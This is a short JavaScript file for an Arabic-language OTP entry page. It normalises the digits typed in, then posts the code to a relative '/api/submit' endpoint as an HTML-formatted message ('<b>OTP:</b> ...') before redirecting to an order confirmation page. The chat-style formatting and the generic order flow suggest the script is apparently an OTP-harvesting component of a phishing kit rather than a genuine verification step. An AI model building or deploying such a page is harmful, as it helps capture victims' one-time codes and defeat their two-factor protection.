(function(){
  const $ = id => document.getElementById(id);
  const form = $('otpForm');
  const otp = $('otp');
  const loading = $('loading');
  const verifyBtn = $('verifyBtn');
  const whatsappBtn = $('whatsappBtn');
  const otpError = $('otpError');
  const WHATSAPP_URL = 'https://wa.me/0000000000';
  const yearEl = document.querySelector('#year');
  if(yearEl) yearEl.textContent = new Date().getFullYear();

  function normalizeDigits(str=''){
    const map={'٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9','۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9'};
    return (str+'').replace(/[٠-٩۰-۹]/g,d=>map[d]||d);
  }

  function esc(s=''){
    return String(s).replace(/[<&>]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
  }

  if(whatsappBtn) whatsappBtn.addEventListener('click', ()=>{ window.open(WHATSAPP_URL,'_blank'); });
  if(otp) otp.addEventListener('input', ()=>{ otpError.style.display='none'; });

  form.addEventListener('submit', async function(e){
    e.preventDefault();
    const code = normalizeDigits(otp.value.trim());
    if(!code){
      otpError.textContent='يرجى إدخال رمز التحقق';
      otpError.style.display='block';
      return;
    }
    otpError.style.display='none';
    loading.style.display='block';
    verifyBtn.disabled=true;
    try{
      const res = await fetch('/api/submit',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({payload:`<b>OTP:</b> ${esc(code)}`})
      });
      const data = await res.json();
      if(!res.ok || !data.ok){
        otpError.textContent = data.error || 'تعذّر التحقق من الرمز';
        otpError.style.display='block';
        return;
      }
      const orderId = data.orderId;
      window.location.href = 'confirmation.html?order=' + encodeURIComponent(orderId);
    }catch(ex){
      console.error(ex);
      otpError.textContent='تعذّر الاتصال بالخادم';
      otpError.style.display='block';
    }finally{
      loading.style.display='none';
      verifyBtn.disabled=false;
    }
  });
})();
